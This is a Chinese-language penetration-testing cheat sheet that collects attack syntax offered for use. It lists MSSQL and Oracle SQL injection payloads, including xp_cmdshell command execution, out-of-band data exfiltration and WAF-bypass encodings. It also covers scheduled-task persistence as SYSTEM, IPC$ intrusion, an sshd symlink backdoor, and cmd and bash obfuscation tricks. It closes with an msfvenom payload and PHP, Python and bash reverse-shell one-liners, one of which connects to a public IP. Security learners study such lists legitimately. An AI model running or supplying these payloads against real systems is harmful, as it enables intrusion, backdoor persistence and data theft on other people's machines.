# 渗透相关语法

相关漏洞学习资料，利用方法和技巧合集 


目录
-----------------

* [Hacking study](#渗透相关语法)
	* [信息收集](#信息收集)
		* [域名相关](#域名相关)
		* [指纹识别](#指纹识别)
		* [ip位置](#ip位置)
		* [备案查询](#备案查询)
		* [目录枚举](#目录枚举)
		* [github语法](#github语法)
		* [端口扫描](#端口扫描)
		* [其他](#其他)
	* [注入基础](#注入基础)
		 * [mssql注入](#mssql注入)
			* [布尔注入](#布尔注入)
			* [报错注入](#报错注入)
			* [waf绕过](#waf绕过)
		 * [oracle注入](#oracle注入)
			* [联合查询](#联合查询)
			* [报错注入](#报错注入)
			* [带外注入](#带外注入)
			* [时间盲注](#时间盲注)
	* [命令及后门相关](#命令及后门相关)
			* [开3389](#开3389)
			* [运行计划任务](#运行计划任务)
			* [IPC入侵](#IPC入侵)
			* [nmap命令](#nmap命令)
			* [sshd软链接后门](#sshd软链接后门)
			* [lsof命令](#lsof命令)
			* [linux命令bypass](#linux命令bypass)
			* [cmd命令bypass](#cmd命令bypass)
			* [msf命令](#msf命令)
			
	* [shell反弹](#shell反弹)
			* [php反弹shell](#php反弹shell)
			* [python反弹shell](#python反弹shell)
			* [bash反弹shell](#bash反弹shell)
			
			
			
## 信息收集

> **前端js代码进行审计发现的一些路径记得去测试访问**

### 域名相关

***工具***
```
subDomainsBrute：https://github.com/lijiejie/subDomainsBrute
Sublist3r
subfinder
dnsbrute：https://github.com/chuhades/dnsbrute
```
**在线查询**
```
https://d.chinacycc.com/index.php?m=login
http://z.zcjun.com/
https://phpinfo.me/domain/
```
**查询域名信息**
```
http://link.chinaz.com/
几个whois查询站点：Chinaz、Aliyun、Whois365 
```
### 指纹识别

**查询web/系统指纹**
```
https://www.ddosi.com/ 
https://whatweb.net/
https://www.zoomeye.org/
http://whatweb.bugscaner.com
http://www.yunsee.cn/
http://whatweb.bugscaner.com/look/ 
http://www.yunsee.cn/finger.html 
```

### ip位置

**查询ip地理位置**
```
https://www.ipip.net/
```
**查询物联网等信息**
```
https://www.oshadan.com/
```

### 备案查询

**备案号查询**
```
http://www.beianbeian.com/
```
**ssl证书查询**
```
https://myssl.com/
https://censys.io/
```
**搜索引擎查询**
```
google，baidu，bing，fofa， 
shodan：https://www.shodan.io/ 
```

### 目录枚举
**目录爆破（可以查看html源代码收集目录）**
```
https://github.com/7kbstorm/7kbscan-WebPathBrute
dirsearch
御剑工具
Web敏感文件robots.txt、crossdomain.xml、sitemap.xml 
```

### github语法

**通过github收集信息**
``` 
"xxx.com" API_key
"xxx.com" secret_key
"xxx.com" aws_key
"xxx.com" Password 
"xxx.com" FTP
"xxx.com"  login 
"xxx.com" github_token
"api.xxx.com" 
```

**IP段收集**
``` 
通过shodan来收集ip段，通过shodan来收集ip主要是利用shodan收集厂商特征ico
通过AS号收集ip段我们可以通过在线网站 https://bgp.he.net 来查厂商的所属ip段 
通过ip服务器查询：
webscan：http://www.webscan.cc/
微步：https://x.threatbook.cn/
netcraft：https://toolbar.netcraft.com/site_report 
```

### 端口扫描
**端口查询**
```
利用masscan来扫描全端口，再调用nmap来扫描端口开启的服务，扫完端口后我们可以写个脚本来解析nmap的扫描结果，将开放的端口提取出来 
```

### 其他

**邮箱挖掘**
```
通过TheHarvester可以进行邮箱挖掘 
```
**厂商业务收集**
```
除了web端的信息收集以外，app和公众号也是我们不可忽视的一点，很多大的漏洞往往就在app端或者公众号上，收集厂商app的方法，一般我是利用crunchbase来进行app的收集的，除了app，公众号也可以通过天眼查和微信自身的搜索功能进行收集的。 
利用云网盘搜索工具搜集敏感文件https://www.lingfengyun.com/ 
```
**免费接码**
```
http://www.smszk.com/
http://www.z-sms.com/
https://getfreesmsnumber.com/
https://www.freeonlinephone.org/
http://mail.bccto.me/
http://24mail.chacuo.net/
```
**几个生成字典方式**
```
https://github.com/rootphantomer/Blasting_dictionary
https://www.itxueke.com/tools/pass/#
http://xingchen.pythonanywhere.com/index
https://github.com/LandGrey/pydictor
https://www.somd5.com/download/dict/
```		
		
## 注入基础
> **mssql、mysql、oracle 相关注入基础语句** 
### mssql注入

#### 布尔注入

**判断版本号**
```
' aNd @@version LIKE '%2015%'--+	
```
**如果存在，返回 true说明后台数据库是MSSQL，否则返回 false**
```
' and exists(select * from sysobjects)--+	
```
**判断当前是否为sa**
```
' and exists(select is_srvrolemember('sysadmin'))--+	
```
**判断有没有xp_cmdshell扩展**
```
' and (select count(*) FROM master. dbo.sysobjects Where xtype ='X' AND name = 'xp_cmdshell')>0--+	
```
**恢复xp_cmdshell**
```
';dbcc addextendedproc ("sp_oacreate","odsole70.dll")
';dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
或
';exec sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'--+
```
**开启xp_cmdshell**
```
;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--+
```
**命令执行**
```
';exec master..xp_cmdshell 'net user'--+	
' and 1=(select * from openrowset('sqloledb','trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''net user'''))--+
```
**创建一个包含两个字段t1的cmd_sql表**
```
'; CREATE TABLE cmd_sql (t1 varchar(8000))--+
将执行结果存入t1中
';+insert into cmd_sql(t1) exec master..xp_cmdshell 'net user'--+
```
**开启3389端口**
```
';exec master..xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f'--+	
```

#### 报错注入

**查看版本号**
```
file_name(@@version)
```
**变换N的值就可以爆出所有数据库的名称**
```
' and (convert(int,db_name(N)))>0--+ 
```
**查看当前用户**
```
' and (user)>0--+ 	
' and 1=(select CAST(USER as int))--+
```
**获取当前数据库**  
```
' and 1=(select db_name())--+
```
**获取数据库该语句是一次性获取全部数据库，且语句只适合>=2005**
```
' and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(''))--+
' and 1=(select '|'%2bname%2b'|' from master..sysdatabases FOR XML PATH(''))--+
```
**获取数据库所有表（只限于mssql2005及以上版本）**
```
' and 1=(select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--+
' and 1=(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--+
' and 1=(select top 1 name from sysobjects where xtype='u' and name <> '第一个数据库表名')--+
```
**一次性爆N条所有字段的数据（只限于mssql2005及以上版本）**
```
' and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(''))--+
' and 1=(select top 1 * from 指定数据库..指定表名 FOR XML PATH(''))--+
```
**暴表**
```
' and 1=convert(int,(select top 1 table_name from information_schema.tables))--+
```

#### waf绕过

**获取版本和数据库名**
```
'%1eaNd%1e@@version LIKE '%2015%'--+	
'%1eoR%1e1=(db_name/**/()%1e)%1e--+
```
**获取全部数据库**
```
'%1eoR%1e1=(SelEct/*xxxxxxxxxxxx*/%1equotename(name)%1efRom master%0f..sysobjects%1ewHerE%1extype='U' FOR XML PATH(''))%1e--
```
**获取表的所有列**
```
'%1eaND%1e1=(SelEct/*xxxxxxxxxxxx*/%1equotename/**/(name)%1efRom 数据库名%0f..syscolumns%1ewHerE%1eid=(selEct/*xxxxxxxxx*/%1eid%1efrom%1e数据库名%0f..sysobjects%1ewHerE%1ename='表名')%1efoR%1eXML%1ePATH/**/(''))%1e-
```

### oracle注入

#### 联合查询

**判断是否oracle，在mssql和mysql以及db2内返回长度值是调用len()函数；在oracle和INFORMIX则是length()**
```
' and len('a')=1--+
```
**获取当前数据库用户**
```
' and 1=2 union select null,(select banner from sys.v_$version where rownum=1),null from dual--+
```
**爆当前数据库中的第二个表**
```
' and 1=2 union select 1,(select table_name from user_tables where rownum=1 and table_name not in ('第一个表')) from dual--+
```
**爆某表中的第一个字段**
```
' and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写的）') from dual--+
```

#### 报错注入

**获取当前数据库用户**
```
' and 1=ctxsys.drithsx.sn(1,(select user from dual))--+
' and 1=utl_inaddr.get_host_name((select user from dual))--+
' and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual)--+
' and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)--+
' and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null--+
' and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null--+
' and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null--+
' and (select dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null--+
' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null--+
```

#### 带外注入

**获取当前数据库用户**
```
' and (select utl_inaddr.get_host_address((select user from dual)||'.xxx.xxx') from dual) is not null--+
```
**获取版本信息**
```
' and 1=utl_http.request('.xxx.xxxx'||(select banner from sys.v_$version where rownum=1))--+
' and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.xxxx.xxxx') from dual) is not null--+
```

#### 时间盲注

**当前获取用户**
```
' and 1=(DBMS_PIPE.RECEIVE_MESSAGE('a',10))--+
' AND 7238=(CASE WHEN (ASCII(SUBSTRC((SELECT NVL(CAST(USER AS VARCHAR(4000)),CHR(32)) FROM DUAL),1,1))>96) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(106)||CHR(72)||CHR(73),1) ELSE 7238 END)
```

## 命令及后门相关

### 开3389

**DOS下开3389**
```
sc config termservice start= auto
net start termservice
允许外连
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f 
-------------------------------------------
echo Windows Registry Editor Version 5.00>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>3389.reg 
echo "fDenyTSConnections"=dword:00000000>>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]>>3389.reg 
echo "PortNumber"=dword:00000d3d>>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]>>3389.reg 
echo "PortNumber"=dword:00000d3d>>3389.reg
之后执行
regedit /s 3389.reg
```
### 运行计划任务

**windows运行计划任务**
```
使用administrator创建以system用户身份运行程序的计划任务，可以运行如远控或msf后门等
命令： 
schtasks /create /tn "system" /tr C:\Windows\system321.exe\system321.exe /sc MINUTE /mo 1  /ru "System" /RL HIGHEST

参数说明： 
/create #创建任务 
/tn "system"     #指定任务名称为system 
/tr C:\Windows\system321.exe\system321.exe     #指定程序路径 
/sc MINUTE /mo 1     #指定类型；MINUTE表示任务每n分钟运行一次，/mo 1表示每1分钟执行一次
/ru "System"     #指定为system用户运行该任务 
/RL HIGHEST     #运行级别，HIGHEST为使用最高权限运行
```

### IPC入侵

**IPC命令**
```
net share 查看本地开启的共享 
net share ipc$ 开启ipc$共享 
net use \\ip\ipc$ "" /user:"" 	建立IPC空链接 
net use \\ip\ipc$ "密码" /user:"用户名" 	建立IPC非空链接 
net use h: \\ip\c$ "密码" /user:"用户名" 	直接登陆后映射对方C：到本地为H: 
net use \\ip\ipc$ /del 	删除IPC链接 
net use h: /del 	删除映射对方到本地的为H:的映射 
net time \127.0.0.25         #查时间
at \\ip time 程序名(或一个命令) /r 	在某时间运行对方某程序并重新启动计算机
at \\127.0.0.25 10:50 srv.exe  #用at命令在0点50分启动srv.exe（注意这里设置的时间要比主机时间快）
at \\127.0.0.25 10:50 "echo 5 > c:\t.txt" 在远程计算机上建立文本文件t.txt； 
copy srv.exe \\hacden-pc\c$    #复制srv.exe到目标c盘上去 
```
### nmap命令
```
查询在线主机
nmap -sn 192.168.56.0/24

端口和服务
nmap -sS -sV -T5 -A -p- 192.168.0.109

```

### sshd软链接后门
```
1、服务端执行
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345
ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oport=12345
ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oport=12345

2、客户端执行
ssh root@x.x.x.x -p 12345

#输入任意密码就可以root用户权限登陆了，如果root用户被禁止登陆时，可以利用其他存在的用户身份登陆，比如：ubuntu

检测
1、查看可疑端口
netstat -antlp
2、查看可执行文件
ls -al /tmp/su
清除
1、禁止PAM认证
vim /etc/ssh/sshd_config
UsePAM no
2、重载
/etc/init.d/sshd reload

```

### lsof命令
```
列出某个用户打开文件的信息：
lsof -u username

列出以进程号打开的文件： 
lsof -p 1,234

列出所有网络连接：
lsof -i 

列出所有tcp连接：
lsof -i tcp 

查出22端口现在运行什么程序： 
lsof -i :22

列出谁在使用某个端口：
lsof -i tcp:3389

列出某个用户所有活跃的网络连接：
lsof -a -u username -i

```

### linux命令bypass
```
使用反斜杠
w\ho\am\i

空格绕过
使用<和>
cat<>flag
cat<1.sh 
使用特殊变量:$IFS
cat$IFS\flag
cat${IFS}flag

使用特殊变量${9}
${9}对应空字符串关键字过滤绕过，使用$*和$@，$x(x代表1-9),${x}(x>=10)
ca$*t  flag
ca$@t flag
ca$2t flag
ca${11} flag

花括号还有一种用法：{command,argument}
{cat,flag}

使用双引号和单引号
ca"t" 1.sh
ca't' 1.sh

使用base64
echo 'Y2F0IC4vZmxhZwo=' |base64 -d |bash

使用进制
$(printf '\x00\x00\x00\x00\x00')
使用%0a(\n)，%0d(\r)，%09(\t)等字符也可以bypass

突破终端限制执行脚本内容：
man -P /tmp/runme.sh man

突破终端限制执行脚本中的命令：
tar cvzf a.tar.gz --checkpoint-action=exec=./a.sh --checkpoint=1 a.sh 
tar c a.tar -I ./runme.sh a

CVE-2014-6271
env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id 

awk执行系统命令三种方法：
awk 'BEGIN{system("echo abc")}' 
awk 'BEGIN{print "echo","abc"| "/bin/bash"}' 
awk '{"date"| getline d; print d; close("d")}'

```

### cmd命令bypass
```
逗号------------net user
,;,%coMSPec:~ -0, +27%,; ,;, ;/b, ;;; ,/c, ,,, ;start; , ; ;/b ; , /min ,;net user

括号-----------netstat /ano | findstr LISTENING
,;,%coMSPec:~ -0, +27%,; ,;, ;/b, ;;; ,/c, ,,, ;start; , ; ;/b ; , /min ,;netstat -ano |; ,;( (,;,((findstr LISTENING)),;,) )

转义字符------------netstat /ano | findstr LISTENING
,;,%coMSPec:~ -0, +27%,; ,;, ;^^^^/^^^^b^^^^, ;;; ,^^^^/^c, ,,, ;^^st^^art^^; , ; ;/^^^^b ; , ^^^^/^^^^min ,;net^^^^stat ^^^^ ^^^^-a^^^^no ^^^^ ^|; ,;( ^ (,;^,(^(fi^^^^ndstr LIST^^^^ENING)^),;^,) ^ )

设置环境变量------
#cmd /c "set com3= &&set com2=user&&set com1=net &&call %com1%%com2%%com3%"
#cmd /c "set com3= /ano&&set com2=stat&&set com1=net&&call %com1%%com2%%com3%"
#cmd /c "set com3= &&set com2=user&&set com1=net &&call set final=%com1%%com2%%com3%&&call %final%"

随机大小写-------
CMd /C "sEt coM3= /ano&& SEt cOm2=stat&& seT CoM1=net&& caLl SeT fiNAl=%COm1%%cOm2%%coM3%&& cAlL %FinAl%"

逗号和分号---------
;,,CMd,; ,/C ", ;, ;sEt coM3= &&,,,SEt cOm2=user&&;;;seT CoM1=net &&, ;caLl,;,SeT fiNAl=%COm1%%cOm2%%coM3%&&; , ,cAlL, ;, ;%FinAl%"

将配对双引号添加到输入命令以混淆其最终命令行参数
;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n^^e””t) ) &&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (,,(c^AlL^, ;,^ ;%Fi^nAl^%))"

使用cmd.exe的/ V：ON参数启用延迟环境变量扩展
;,,C^Md^,; /V:ON,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n^^””e””t) ) &&set quotes=””&&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^%) )"

```

### msf命令
```
生成exe文件
msfveom -p windows/metepreter/reverse_tcp -a x86 --platform windows LHOST=192.168.43.63 LPORT=4444 -e x86/shikata_ga_nai -i 20 PrependMigrate=true -f exe >ma.exe
```

## shell反弹

### php反弹shell

```
攻击机监听
nc -lvvp 4444

要求目标机器有php然后执行
php -r '$sock=fsockopen("192.168.23.88",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

```

### python反弹shell

```
代码
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.104",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])


受害机执行
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.104",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'


攻击机执行
nc -lvvp 5555

交互shell
python -c 'import pty; pty.spawn("/bin/bash")'

```

### bash反弹shell

```
攻击机
nc -lvvp 4444

受害机
bash -i >& /dev/tcp/47.98.229.211/4444 0>&1

```
